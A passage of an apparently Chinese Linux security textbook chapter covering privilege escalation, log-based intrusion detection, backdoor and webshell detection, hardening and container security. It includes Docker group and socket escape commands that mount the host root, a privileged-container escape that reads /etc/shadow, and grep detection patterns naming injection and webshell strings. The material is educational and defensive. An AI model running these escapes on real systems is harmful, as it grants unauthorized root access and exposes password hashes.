# 执行SUID程序，它会调用/tmp/service而不是/usr/sbin/service
```

### 1.8 方法六：Docker组提权

```bash
# 如果当前用户在docker组中
id | grep docker

# 可以通过Docker挂载宿主机文件系统提权
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
# 或
docker run -v /:/hostfs -it ubuntu /bin/bash
# 在容器内访问/hostfs就是宿主机的根文件系统
```

## 案例二：日志分析与入侵检测

### 2.1 背景说明

日志分析是安全运维和事件响应的核心技能。通过分析系统日志，可以发现入侵行为、追踪攻击路径、评估损失范围。

### 2.2 SSH暴力破解检测

```bash
# 查找所有登录失败记录
grep "Failed password" /var/log/auth.log

# 统计每个IP的失败次数
grep "Failed password" /var/log/auth.log | \
    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# 输出示例：
#   1523 192.168.1.200
#    456 10.0.0.50
#     23 172.16.0.10

# 查找成功登录
grep "Accepted" /var/log/auth.log

# 统计成功登录的IP和用户
grep "Accepted" /var/log/auth.log | \
    awk '{print $11, $9}' | sort | uniq -c | sort -rn

# 查找暴力破解后的成功登录（可能是入侵成功）
# 先找到暴力破解的IP
SUSPECT_IP=$(grep "Failed password" /var/log/auth.log | \
    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

# 检查该IP是否有成功登录
grep "Accepted.*$SUSPECT_IP" /var/log/auth.log
```

### 2.3 Web攻击日志分析

```bash
# SQL注入检测
grep -iE "(union.*select|concat\(|group_concat|information_schema|/etc/passwd|load_file)" \
    /var/log/apache2/access.log

# XSS检测
grep -iE "(<script|alert\(|onerror|onload|javascript:)" \
    /var/log/apache2/access.log

# 目录遍历检测
grep -iE "(\.\./|\.\.\\\\)" /var/log/apache2/access.log

# 命令注入检测
grep -iE "(;ls|;cat|;id|;whoami|wget |curl |\|.*sh)" \
    /var/log/apache2/access.log

# Web Shell访问检测
grep -iE "(\.php\?cmd=|\.asp\?cmd=|eval\(|system\(|passthru\()" \
    /var/log/apache2/access.log

# 异常404请求（可能的目录扫描）
awk '$9 == 404 {print $7}' /var/log/apache2/access.log | \
    sort | uniq -c | sort -rn | head -20

# 高频访问IP（可能的扫描或DDoS）
awk '{print $1}' /var/log/apache2/access.log | \
    sort | uniq -c | sort -rn | head -20
```

### 2.4 综合日志分析脚本

```bash
#!/bin/bash
# 综合日志分析脚本

echo "=========================================="
echo "       安全日志分析报告"
echo "       分析时间: $(date)"
echo "=========================================="

AUTH_LOG="/var/log/auth.log"
WEB_LOG="/var/log/apache2/access.log"

echo ""
echo "[1] SSH暴力破解检测"
echo "------------------------------------------"
if [ -f "$AUTH_LOG" ]; then
    FAILED_COUNT=$(grep -c "Failed password" "$AUTH_LOG" 2>/dev/null)
    echo "总失败次数: $FAILED_COUNT"
    if [ "$FAILED_COUNT" -gt 0 ]; then
        echo "攻击源IP (Top 5):"
        grep "Failed password" "$AUTH_LOG" | \
            awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -5
    fi
else
    echo "未找到认证日志"
fi

echo ""
echo "[2] 成功登录记录"
echo "------------------------------------------"
if [ -f "$AUTH_LOG" ]; then
    grep "Accepted" "$AUTH_LOG" | \
        awk '{print $1, $2, $3, $9, $11}' | tail -10
fi

echo ""
echo "[3] Web攻击检测"
echo "------------------------------------------"
if [ -f "$WEB_LOG" ]; then
    SQLI=$(grep -ciE "(union.*select|concat\(|information_schema)" "$WEB_LOG" 2>/dev/null)
    XSS=$(grep -ciE "(<script|alert\(|onerror)" "$WEB_LOG" 2>/dev/null)
    LFI=$(grep -ciE "(\.\./|\.\.\\\\)" "$WEB_LOG" 2>/dev/null)
    echo "疑似SQL注入: $SQLI 次"
    echo "疑似XSS攻击: $XSS 次"
    echo "疑似目录遍历: $LFI 次"
fi

echo ""
echo "[4] 高频访问IP"
echo "------------------------------------------"
if [ -f "$WEB_LOG" ]; then
    awk '{print $1}' "$WEB_LOG" | sort | uniq -c | sort -rn | head -10
fi

echo ""
echo "[5] 最近的可疑操作"
echo "------------------------------------------"
if [ -f "$AUTH_LOG" ]; then
    grep -iE "(sudo|su |chmod|chown|useradd|userdel)" "$AUTH_LOG" | tail -10
fi

echo ""
echo "=========================================="
echo "       分析完成"
echo "=========================================="
```

## 案例三：后门检测与清除

### 3.1 背景说明

攻击者在入侵系统后通常会植入后门以维持访问。常见的后门类型包括：SSH密钥后门、定时任务后门、启动脚本后门、Web Shell、Rootkit等。

### 3.2 SSH密钥后门检测

```bash
# 查找所有authorized_keys文件
find / -name "authorized_keys" -type f 2>/dev/null

# 查看每个authorized_keys的内容
for f in $(find / -name "authorized_keys" -type f 2>/dev/null); do
    echo "=== $f ==="
    cat "$f"
    echo ""
done

# 查找所有SSH私钥
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

# 检查SSH配置
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"
```

### 3.3 定时任务后门检测

```bash
# 检查所有用户的crontab
for user in $(cut -d: -f1 /etc/passwd); do
    echo "=== $user ==="
    crontab -l -u "$user" 2>/dev/null
done

# 检查系统级定时任务
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# 检查systemd定时器
systemctl list-timers --all

# 检查at任务
atq
```

### 3.4 启动脚本后门检测

```bash
# 检查rc.local
cat /etc/rc.local 2>/dev/null
ls -la /etc/rc.local 2>/dev/null

# 检查init.d脚本
ls -la /etc/init.d/

# 检查systemd服务
systemctl list-unit-files --type=service
# 查找自定义的非标准服务
ls -la /etc/systemd/system/
ls -la /lib/systemd/system/

# 检查用户登录脚本
cat /root/.bashrc
cat /root/.profile
cat /root/.bash_profile
```

### 3.5 Web Shell检测

```bash
# 查找最近修改的PHP文件
find /var/www -name "*.php" -mtime -30 -type f

# 搜索常见的Web Shell特征
grep -rn "eval(\|system(\|exec(\|passthru(\|shell_exec(" /var/www/ 2>/dev/null
grep -rn "base64_decode(\|gzinflate(\|gzuncompress(" /var/www/ 2>/dev/null
grep -rn '\$\{.*\}' /var/www/ 2>/dev/null    # 可能的变量函数调用
grep -rn "str_rot13\|str_replace.*chr(" /var/www/ 2>/dev/null

# 使用工具扫描
# 使用LMD (Linux Malware Detect)
sudo maldet -a /var/www/

# 使用ClamAV
sudo clamscan -r /var/www/
```

### 3.6 Rootkit检测

```bash
# 使用rkhunter
sudo apt install rkhunter
sudo rkhunter --check

# 使用chkrootkit
sudo apt install chkrootkit
sudo chkrootkit

# 手动检查
# 对比ps输出与/proc
ps aux > /tmp/ps_output.txt
ls /proc | grep -E "^[0-9]+" > /tmp/proc_output.txt
# 对比两个列表，查找隐藏进程

# 检查网络连接
ss -tunlp
# 对比lsof的输出
lsof -i -P -n

# 检查LD_PRELOAD后门
cat /etc/ld.so.preload 2>/dev/null
echo $LD_PRELOAD
```

## 案例四：系统加固

### 4.1 SSH加固

```bash
# 备份原配置
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# 修改SSH配置
cat > /etc/ssh/sshd_config.d/hardening.conf << 'EOF'
# 修改默认端口
Port 2222

# 禁止root登录
PermitRootLogin no

# 禁用密码认证
PasswordAuthentication no

# 限制认证尝试次数
MaxAuthTries 3

# 只允许特定用户
AllowUsers deploy admin

# 禁用空密码
PermitEmptyPasswords no

# 设置登录超时
LoginGraceTime 60

# 禁用X11转发
X11Forwarding no

# 使用强加密算法
KexAlgorithms curve25519-sha256@libssh.org
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
EOF

# 重启SSH服务
sudo systemctl restart sshd
```

### 4.2 防火墙加固

```bash
# 使用iptables配置基本防火墙
# 清除所有规则
sudo iptables -F
sudo iptables -X

# 设置默认策略
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 允许回环接口
sudo iptables -A INPUT -i lo -j ACCEPT

# 允许已建立的连接
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 允许SSH（修改后的端口）
sudo iptables -A INPUT -p tcp --dport 2222 -j ACCEPT

# 允许HTTP/HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# 限制ICMP
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT

# 记录被丢弃的包
sudo iptables -A INPUT -j LOG --log-prefix "IPT-DROP: "
sudo iptables -A INPUT -j DROP

# 保存规则
sudo iptables-save > /etc/iptables/rules.v4

# 使用ufw（更简单的防火墙管理）
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 2222/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

### 4.3 系统更新与补丁管理

```bash
# 自动安全更新（Debian/Ubuntu）
sudo apt install unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades

# 手动更新
sudo apt update && sudo apt upgrade -y

# 检查安全更新
sudo apt list --upgradable 2>/dev/null | grep -i security
```

### 4.4 文件完整性监控

```bash
# 安装AIDE
sudo apt install aide

# 初始化数据库
sudo aideinit

# 检查文件变化
sudo aide --check

# 更新数据库
sudo aide --update
```

## 案例五：容器安全基础

### 5.1 Docker安全检查

```bash
# 检查Docker daemon配置
cat /etc/docker/daemon.json

# 检查容器的特权模式
docker ps --format "{{.ID}} {{.Names}}" | while read id name; do
    priv=$(docker inspect --format='{{.HostConfig.Privileged}}' "$id")
    echo "$name: Privileged=$priv"
done

# 检查容器的能力
docker inspect --format='{{.HostConfig.CapAdd}}' container_name

# 查看容器的网络模式
docker inspect --format='{{.HostConfig.NetworkMode}}' container_name

# 检查容器内运行的进程
docker top container_name
```

### 5.2 容器逃逸基础

**Docker Socket挂载逃逸**：
```bash
# 如果容器内挂载了Docker Socket
ls -la /var/run/docker.sock

# 可以通过Docker Socket控制宿主机
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu chroot /host
```

**特权容器逃逸**：
```bash
# 如果容器以特权模式运行
# 挂载宿主机文件系统
mkdir /tmp/host
mount /dev/sda1 /tmp/host
cat /tmp/host/etc/shadow
```

## 本节小结

本节通过五个实战案例展示了Linux系统安全的核心内容：本地提权、日志分析、后门检测、系统加固和容器安全。这些技能是安全运维和渗透测试的基本功。重要的是，所有这些技术都应该在授权的测试环境中使用，用于提升系统安全性，而非进行非法活动。


***
# 第06章 操作系统基础-Linux - 常见误区

## 误区一：Linux不会感染病毒

### 错误认知
很多人认为Linux是安全的，不会像Windows那样感染病毒，所以不需要安装杀毒软件。

### 事实真相
1. **Linux恶意软件确实存在**：虽然数量比Windows少，但Linux恶意软件一直在增长
2. **服务器是高价值目标**：Linux服务器存储着大量敏感数据，是攻击者的重点目标
3. **Rootkit**：Linux rootkit可以隐藏在内核模块中，极难检测
4. **挖矿木门**：大量被入侵的Linux服务器被用作加密货币挖矿
5. **供应链攻击**：通过污染Linux软件包仓库传播恶意软件
6. **容器逃逸**：Docker等容器技术的漏洞可以导致宿主机被入侵

### 正确理解
Linux的安全性来自于其设计和权限模型，但不代表它不可攻破。安全需要主动维护，包括及时更新、合理配置、监控异常等。

## 误区二：用root账户日常操作很方便

### 错误认知
使用root账户可以避免各种权限问题，操作更方便，反正自己的电脑不会有安全问题。

### 事实真相
1. **一个误操作就可以摧毁系统**：`rm -rf /` 在root权限下会删除整个系统
2. **恶意软件获得最高权限**：如果以root运行的程序被入侵，攻击者直接获得完全控制
3. **无法审计**：所有操作都是root执行的，出了问题无法定位是哪个操作导致的
4. **违反最小权限原则**：安全的基本原则是只授予必要的权限

### 正确理解
日常操作应该使用普通用户，只在需要时使用sudo。这不仅是为了安全，也是为了养成良好的操作习惯。

## 误区三：防火墙配置了就安全了

### 错误认知
配置了iptables/ufw防火墙，系统就是安全的了。

### 事实真相
1. **防火墙只控制网络访问**：它无法防御本地提权、Web应用漏洞等攻击
2. **规则可能配置错误**：过于宽松的规则等于没有规则
3. **出站流量通常不控制**：恶意软件可以通过出站连接与C2服务器通信
4. **内核漏洞可以绕过防火墙**：某些漏洞可以直接操作网络栈
5. **应用层攻击穿过防火墙**：SQL注入、XSS等不会被传统防火墙拦截

### 正确理解
防火墙是安全体系的一部分，需要与IDS/IPS、WAF、应用安全、系统加固等多层防御配合。

## 误区四：chmod 777 能解决权限问题

### 错误认知
遇到"Permission denied"错误时，直接`chmod 777`就好了，反正能用就行。

### 事实真相
1. **777意味着任何人可以读、写、执行**：这是最不安全的权限设置
2. **配置文件不应可写**：如果`/etc/passwd`是777，任何人都可以添加用户
3. **Web目录777意味着可以上传Web Shell**：攻击者可以上传任意PHP文件
4. **SUID程序777更危险**：任何人都可以修改SUID程序来提权

### 正确理解
遇到权限问题时，应该分析原因：
- 是用户不对？用`chown`修改所有者
- 是组不对？用`chgrp`修改组
- 权限不够？精确添加需要的权限，如`chmod u+x`
- 需要更细粒度的控制？使用ACL

## 误区五：关闭SELinux/AppArmor因为太麻烦

### 错误认知
SELinux/AppArmor经常导致应用程序无法正常工作，直接关闭就好了。

### 事实真相
1. **SELinux/AppArmor是强制访问控制**：即使root权限的进程也被限制
2. **很多入侵案例是因为SELinux被关闭**：攻击者获得root后如入无人之境
3. **正确配置不难**：大部分问题可以通过设置正确的上下文或配置文件解决
4. **性能影响很小**：现代SELinux的性能开销可以忽略不计

### 正确理解
遇到SELinux/AppArmor问题时，应该学习如何正确配置，而不是关闭它。`audit2allow`工具可以帮助生成正确的策略规则。

```bash
# 查看SELinux拒绝日志
sudo ausearch -m avc -ts recent

# 自动生成策略
sudo ausearch -m avc -ts recent | audit2allow -M mypolicy
sudo semodule -i mypolicy.pp
```

## 误区六：SSH密钥认证就万无一失

### 错误认知
使用SSH密钥认证比密码安全得多，所以不需要其他安全措施。

### 事实真相
1. **私钥可能泄露**：如果私钥文件权限设置不当（应为600），其他人可以读取
2. **私钥可能被窃取**：如果开发机被入侵，攻击者可以获取所有私钥
3. **没有密码保护的私钥更危险**：如果私钥没有设置密码短语，泄露后直接可用
4. **SSH Agent转发风险**：Agent转发可能被用于跳板攻击

### 正确理解
SSH密钥认证确实比密码安全，但还需要：
- 为私钥设置强密码短语
- 正确设置私钥文件权限（600）
- 定期轮换密钥
- 使用SSH证书认证（更安全的方案）
- 限制可以登录的用户和来源IP

## 误区七：日志太多没必要看

### 错误认知
系统日志太多太杂，反正系统运行正常，不需要查看日志。

### 事实真相
1. **日志是入侵检测的重要来源**：攻击行为通常会在日志中留下痕迹
2. **事后分析依赖日志**：没有日志就无法还原攻击过程
3. **合规要求**：很多安全标准要求保留和分析日志
4. **主动发现问题**：日志可以帮助在问题变严重前发现异常

### 正确理解
日志分析应该是日常运维的一部分。可以使用工具自动化：
- **logwatch**：每日日志摘要
- **fail2ban**：自动封禁暴力破解IP
- **ELK Stack**：日志集中管理和分析
- **OSSEC**：主机入侵检测

## 误区八：容器就是安全隔离

### 错误认知
使用Docker容器就等于安全隔离，容器内的程序不会影响宿主机。

### 事实真相
1. **容器共享内核**：容器不是虚拟机，它与宿主机共享同一个Linux内核
2. **内核漏洞可以逃逸**：容器逃逸漏洞时有发生（CVE-2019-5736等）
3. **特权容器几乎等于root**：`--privileged`模式下容器拥有宿主机的所有能力
4. **Docker Socket是巨大的风险**：挂载Docker Socket意味着可以控制宿主机
5. **镜像可能包含漏洞**：从Docker Hub拉取的镜像可能包含已知漏洞

### 正确理解
容器提供了一定程度的隔离，但不是完全的安全边界。安全的容器使用需要：
- 不使用特权模式
- 使用最小化的基础镜像
- 定期扫描镜像漏洞
- 使用seccomp和AppArmor限制容器能力
- 不挂载敏感目录

## 误区九：Linux不需要备份

### 错误认知
Linux很稳定，不会像Windows那样蓝屏，所以不需要备份。

### 事实真相
1. **硬件故障**：硬盘损坏会导致数据丢失，与操作系统无关
2. **人为误操作**：`rm -rf`可以瞬间删除重要数据
3. **勒索软件**：Linux勒索软件会加密所有文件
4. **入侵后恢复**：被入侵后需要恢复到干净的状态

### 正确理解
备份是安全策略的重要组成部分。遵循3-2-1原则：3份副本、2种介质、1份异地。定期测试备份的恢复能力。

## 误区十：开源软件更安全

### 错误认知
开源软件因为源码公开，经过众人审查，所以一定比闭源软件安全。

### 事实真相
1. **开源不等于被审查**：很多开源项目只有少数人维护，代码可能从未被安全审计
2. **Heartbleed的教训**：OpenSSL被广泛使用但存在严重漏洞多年未被发现
3. **供应链攻击**：开源包仓库（npm、PyPI）中存在大量恶意包
4. **依赖链风险**：一个项目可能依赖数百个开源库，任何一个出问题都会影响

### 正确理解
开源提供了审查的可能性，但不等于已经被审查。安全取决于社区的活跃程度和项目的维护质量。使用开源软件也需要关注安全公告，及时更新。

## 总结

Linux的安全性不是天生的，而是需要正确配置和持续维护的。避免这些常见误区，建立正确的安全观念，是成为合格安全工程师的基础。记住：安全是一个过程，不是一个产品。


***
# 第06章 操作系统基础-Linux - 练习方法

## 一、Linux学习环境搭建

### 1.1 推荐学习环境

**方案一：虚拟机（推荐初学者）**
- VirtualBox（免费）或VMware Workstation Player（免费用于个人）
- 安装Ubuntu Desktop 22.04 LTS或Kali Linux
- 分配至少2GB内存、20GB硬盘
- 优点：安全隔离、快照功能、不影响主机系统

**方案二：WSL2（Windows用户推荐）**
```bash
# 在PowerShell中执行
wsl --install -d Ubuntu-22.04
```
- 优点：与Windows集成好、启动快、资源占用少
- 缺点：某些内核功能不可用

**方案三：双系统**
- 在电脑上同时安装Windows和Linux
- 优点：性能最好、完整的Linux体验
- 缺点：切换系统不方便

**方案四：云服务器**
- 购买一台便宜的VPS（如Vultr $2.5/月、DigitalOcean $4/月）
- 优点：可以练习网络相关操作、24小时在线
- 缺点：需要付费、不适合练习危险操作

### 1.2 Kali Linux安装

Kali Linux是安全领域最常用的发行版，预装了大量安全工具。

```bash
# 下载Kali Linux虚拟机镜像
# https://www.kali.org/get-kali/#kali-virtual-machines

# 或者安装Kali到物理机/虚拟机
# 下载ISO：https://www.kali.org/get-kali/#kali-installer

# 安装后的基本配置
sudo apt update && sudo apt upgrade -y
sudo apt install -y vim git curl wget net-tools
```

## 二、命令行基础练习

### 2.1 文件操作练习（第1-2天）

**练习目标**：熟练掌握基本的文件和目录操作

```bash
# 创建练习目录结构
mkdir -p ~/练习/{文档,脚本,下载}
cd ~/练习

# 练习1：创建和编辑文件
touch 文档/test.txt
echo "Hello Linux" > 文档/test.txt
cat 文档/test.txt
vim 文档/test.txt    # 学习基本的vim操作（i插入、Esc、:wq保存退出）

# 练习2：复制、移动、删除
cp 文档/test.txt 文档/test_backup.txt
mv 文档/test.txt 文档/hello.txt
rm 文档/test_backup.txt

# 练习3：目录操作
mkdir -p 文档/子目录1/子目录2
tree 文档
rmdir 文档/子目录1/子目录2    # 只能删除空目录
rm -r 文档/子目录1            # 递归删除

# 练习4：查找文件
find ~ -name "*.txt" -type f
find ~ -name "hello*" -type f
find ~ -empty -type d

# 练习5：权限操作
ls -la 文档/
chmod 755 文档/hello.txt
chmod u-w 文档/hello.txt
chmod +x 脚本/
```

**练习检查**：
- [ ] 能够创建、编辑、复制、移动、删除文件和目录
- [ ] 理解相对路径和绝对路径
- [ ] 能够使用find命令查找文件
- [ ] 理解文件权限的含义和修改方法

### 2.2 文本处理练习（第3-4天）

**练习目标**：掌握grep、sed、awk的基本用法

创建练习文件：
```bash
cat > ~/练习/employees.txt << 'EOF'
张三,技术部,工程师,15000
李四,市场部,经理,20000
王五,技术部,高级工程师,25000
赵六,人事部,主管,18000
钱七,技术部,架构师,35000
孙八,市场部,专员,12000
周九,技术部,工程师,16000
吴十,财务部,会计,14000
EOF
```

```bash
# 练习1：grep搜索
grep "技术部" ~/练习/employees.txt
grep -i "经理\|主管" ~/练习/employees.txt
grep -c "技术部" ~/练习/employees.txt

# 练习2：awk处理
awk -F, '{print $1}' ~/练习/employees.txt              # 打印姓名
awk -F, '{print $1, $4}' ~/练习/employees.txt           # 打印姓名和工资
awk -F, '$2=="技术部" {print $1, $4}' ~/练习/employees.txt    # 技术部员工
awk -F, '{sum+=$4} END {print "平均工资:", sum/NR}' ~/练习/employees.txt

# 练习3：sed替换
sed 's/技术部/研发部/g' ~/练习/employees.txt
sed '3d' ~/练习/employees.txt              # 删除第3行
sed -n '2,4p' ~/练习/employees.txt         # 显示2-4行

# 练习4：管道组合
cat ~/练习/employees.txt | awk -F, '{print $2}' | sort | uniq -c | sort -rn
cat ~/练习/employees.txt | awk -F, '$4 > 20000 {print $1, $4}'
```

**练习检查**：
- [ ] 能够使用grep搜索文本
- [ ] 能够使用awk提取和处理字段
- [ ] 能够使用sed进行文本替换
- [ ] 能够使用管道组合多个命令

### 2.3 系统管理练习（第5-7天）

**练习目标**：掌握系统管理和信息收集

```bash
# 练习1：系统信息收集
uname -a
cat /etc/os-release
free -h
df -h
lsblk

# 练习2：用户管理
# 创建用户
sudo useradd -m testuser
sudo passwd testuser
# 查看用户信息
id testuser
cat /etc/passwd | grep testuser
# 将用户加入sudo组
sudo usermod -aG sudo testuser
# 删除用户
sudo userdel -r testuser

# 练习3：进程管理
ps aux
ps aux --sort=-%cpu | head -10
top    # 按q退出
htop   # 如果已安装
kill -9 <PID>    # 杀死进程

# 练习4：网络管理
ip addr show
ip route show
ss -tunlp
ping -c 4 8.8.8.8
traceroute 8.8.8.8
dig example.com

# 练习5：服务管理
systemctl status ssh
sudo systemctl start ssh
sudo systemctl stop ssh
sudo systemctl enable ssh
sudo systemctl disable ssh

# 练习6：包管理
sudo apt update
sudo apt install vim
apt list --installed | grep vim
sudo apt remove vim
```

**练习检查**：
- [ ] 能够收集系统基本信息
- [ ] 能够创建和管理用户
- [ ] 能够查看和管理进程
- [ ] 能够进行基本的网络诊断
- [ ] 能够使用systemctl管理服务

## 三、Shell脚本练习

### 3.1 脚本基础（第8-10天）

**练习任务**：

```bash
# 任务1：Hello World脚本
cat > hello.sh << 'EOF'
#!/bin/bash
echo "Hello, $(whoami)! Today is $(date)"
echo "系统: $(uname -s)"
echo "主机名: $(hostname)"
EOF
chmod +x hello.sh
./hello.sh

# 任务2：条件判断脚本
cat > check_user.sh << 'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    echo "你是root用户"
else
    echo "你是普通用户: $(whoami)"
    echo "UID: $(id -u)"
fi
EOF
chmod +x check_user.sh
./check_user.sh

# 任务3：循环脚本
cat > port_check.sh << 'EOF'
#!/bin/bash
HOST=${1:-localhost}
PORTS="22 80 443 3306 8080"

for port in $PORTS; do
    if nc -z -w1 "$HOST" "$port" 2>/dev/null; then
        echo "端口 $port: 开放"
    else
        echo "端口 $port: 关闭"
    fi
done
EOF
chmod +x port_check.sh
./port_check.sh 127.0.0.1

# 任务4：系统信息收集脚本
cat > sysinfo.sh << 'EOF'
#!/bin/bash
echo "========== 系统信息 =========="
echo "主机名: $(hostname)"
echo "操作系统: $(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2)"
echo "内核版本: $(uname -r)"
echo "CPU: $(lscpu | grep 'Model name' | cut -d: -f2 | xargs)"
echo "内存: $(free -h | grep Mem | awk '{print $2}')"
echo "磁盘使用:"
df -h | grep -E "^/dev/" | awk '{print "  " $6 ": " $3 "/" $2 " (" $5 ")"}'
echo "IP地址: $(hostname -I)"
echo "=============================="
EOF
chmod +x sysinfo.sh
./sysinfo.sh
```

### 3.2 安全脚本练习（第11-14天）

```bash
# 任务1：SUID文件扫描脚本
cat > suid_scan.sh << 'EOF'
#!/bin/bash
echo "=== SUID文件扫描 ==="
echo "扫描时间: $(date)"
echo ""

find / -perm -4000 -type f 2>/dev/null | while read file; do
    owner=$(stat -c '%U' "$file")
    echo "  $file (所有者: $owner)"
done

echo ""
echo "共找到 $(find / -perm -4000 -type f 2>/dev/null | wc -l) 个SUID文件"
EOF
chmod +x suid_scan.sh
sudo ./suid_scan.sh

# 任务2：登录失败检测脚本
cat > login_check.sh << 'EOF'
#!/bin/bash
LOG="/var/log/auth.log"
echo "=== 登录失败检测 ==="
echo "检测时间: $(date)"
echo ""

if [ ! -f "$LOG" ]; then
    echo "日志文件不存在: $LOG"
    exit 1
fi

TOTAL=$(grep -c "Failed password" "$LOG" 2>/dev/null)
echo "总失败次数: $TOTAL"
echo ""

if [ "$TOTAL" -gt 0 ]; then
    echo "攻击源IP统计:"
    grep "Failed password" "$LOG" | \
        awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10 | \
        while read count ip; do
            if [ "$count" -ge 10 ]; then
                echo "  [!] $ip: $count 次 (疑似暴力破解)"
            else
                echo "  $ip: $count 次"
            fi
        done
fi
EOF
chmod +x login_check.sh
sudo ./login_check.sh

# 任务3：简单端口扫描器
cat > port_scanner.sh << 'EOF'
#!/bin/bash
TARGET=${1:-127.0.0.1}
START=${2:-1}
END=${3:-1024}

echo "扫描目标: $TARGET"
echo "端口范围: $START - $END"
echo "扫描时间: $(date)"
echo ""

for port in $(seq $START $END); do
    (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && \
        echo "端口 $port: 开放"
done

echo ""
echo "扫描完成"
EOF
chmod +x port_scanner.sh
./port_scanner.sh 127.0.0.1 20 25
```

## 四、安全实验练习

### 4.1 提权练习环境

使用CTF靶机练习Linux提权：

```bash
# 下载VulnHub靶机
# Mr. Robot: https://www.vulnhub.com/entry/mr-robot-1,312/
# Kioptrix: https://www.vulnhub.com/entry/kioptrix-1-1-2,22/
# Lin.Security: https://www.vulnhub.com/entry/linsecurity-1,244/

# 或者使用TryHackMe
# https://tryhackme.com/room/linprivesc
# https://tryhackme.com/room/linenum
```

### 4.2 推荐练习平台

- **OverTheWire Bandit**：学习Linux命令行基础
  https://overthewire.org/wargames/bandit/

- **TryHackMe**：引导式学习，有专门的Linux房间
  https://tryhackme.com/

- **HackTheBox**：难度较高的靶机
  https://www.hackthebox.com/

- **PicoCTF**：CTF竞赛练习
  https://picoctf.org/

### 4.3 推荐阅读

- 《鸟哥的Linux私房菜》— 适合入门
- 《Linux命令行与Shell脚本编程大全》— Shell脚本深入
- 《Linux系统管理与网络管理》— 系统管理
- 《How Linux Works》— 深入理解Linux工作原理

## 五、学习计划建议

| 周数 | 学习内容 | 练习任务 |
|------|----------|----------|
| 第1周 | Linux安装、基本命令 | 完成文件操作和文本处理练习 |
| 第2周 | 系统管理、Shell基础 | 完成系统管理练习和简单脚本 |
| 第3周 | Shell脚本、权限管理 | 完成安全脚本练习 |
| 第4周 | 网络管理、安全加固 | 完成安全实验练习 |
| 第5-6周 | 综合练习 | 完成CTF靶机练习 |

每天建议投入1-2小时，理论与实践结合。重要的是坚持每天使用Linux，将其作为日常工作环境。

## 本节小结

Linux的学习是一个持续的过程，需要大量的实践和积累。本节提供了一个结构化的学习路径和练习计划，建议按照计划逐步完成。记住，最好的学习方法就是"用"——将Linux作为你的主力操作系统，在日常使用中学习和成长。


***
# 第06章 操作系统基础-Linux - 本章小结

## 核心知识点回顾

本章系统性地讲解了Linux操作系统的基础知识，从系统架构到安全实践，涵盖了安全研究者需要掌握的核心内容。

### Linux系统架构

- **内核**：操作系统的核心，管理进程、内存、文件系统、网络和设备驱动
- **系统调用**：用户空间与内核交互的接口，是安全研究的重要目标
- **GNU工具**：提供用户空间的基本工具，如coreutils、bash、glibc
- **Shell**：用户与系统交互的命令解释器，Bash是最常用的Shell

### 文件系统与权限

- **FHS标准**：Linux目录结构有明确的标准，了解每个目录的用途对安全分析至关重要
- **权限模型**：所有者/组/其他三组权限，rwx三种操作
- **特殊权限**：SUID（以文件所有者权限执行）、SGID（继承组权限）、Sticky Bit（限制删除）
- **ACL**：更细粒度的权限控制

### 核心技能

| 技能 | 描述 | 安全应用 |
|------|------|----------|
| grep | 文本搜索 | 日志分析、配置检查 |
| sed | 流编辑 | 批量修改配置、数据清洗 |
| awk | 文本处理 | 日志分析、数据统计 |
| find | 文件查找 | 安全审计、恶意文件检测 |
| ps/top | 进程管理 | 异常进程检测 |
| ss/netstat | 网络连接 | 异常连接检测 |
| systemctl | 服务管理 | 后门服务检测 |

### 安全实践

1. **提权技术**：SUID利用、sudo滥用、内核漏洞、定时任务劫持、PATH劫持、Docker组提权
2. **日志分析**：SSH暴力破解检测、Web攻击识别、异常行为发现
3. **后门检测**：SSH密钥、定时任务、启动脚本、Web Shell、Rootkit
4. **系统加固**：SSH加固、防火墙配置、系统更新、文件完整性监控

### 重要安全原则

1. **最小权限原则**：只授予必要的权限，不使用root进行日常操作
2. **纵深防御**：多层安全措施，不依赖单一防护
3. **日志监控**：定期分析日志，及时发现异常
4. **及时更新**：保持系统和软件的最新版本
5. **备份策略**：定期备份，测试恢复能力

## 关键命令速查表

### 信息收集
```bash
uname -a                    # 系统信息
id                          # 当前用户信息
cat /etc/passwd             # 用户列表
ss -tunlp                   # 监听端口
ps aux                      # 进程列表
find / -perm -4000 2>/dev/null  # SUID文件
```

### 文本处理
```bash
grep "pattern" file         # 搜索
sed 's/old/new/g' file      # 替换
awk '{print $1}' file       # 提取字段
cut -d: -f1 /etc/passwd     # 按分隔符提取
sort | uniq -c | sort -rn   # 统计排序
```

### 安全检查
```bash
last                        # 登录历史
lastlog                     # 最后登录
who                         # 当前登录
sudo -l                     # sudo权限
crontab -l                  # 定时任务
cat /etc/shadow             # 密码哈希（需root）
```

### 网络诊断
```bash
ip addr show                # 网络接口
ip route show               # 路由表
ss -tunlp                   # 监听端口
ping -c 4 host              # 连通性测试
traceroute host              # 路由追踪
dig domain                  # DNS查询
```

## 进阶学习方向

完成本章学习后，可以选择以下方向深入：

### Linux系统管理方向
- 深入学习systemd和服务管理
- 掌握LVM、RAID等存储管理
- 学习Linux性能调优
- 掌握自动化运维工具（Ansible、Puppet）

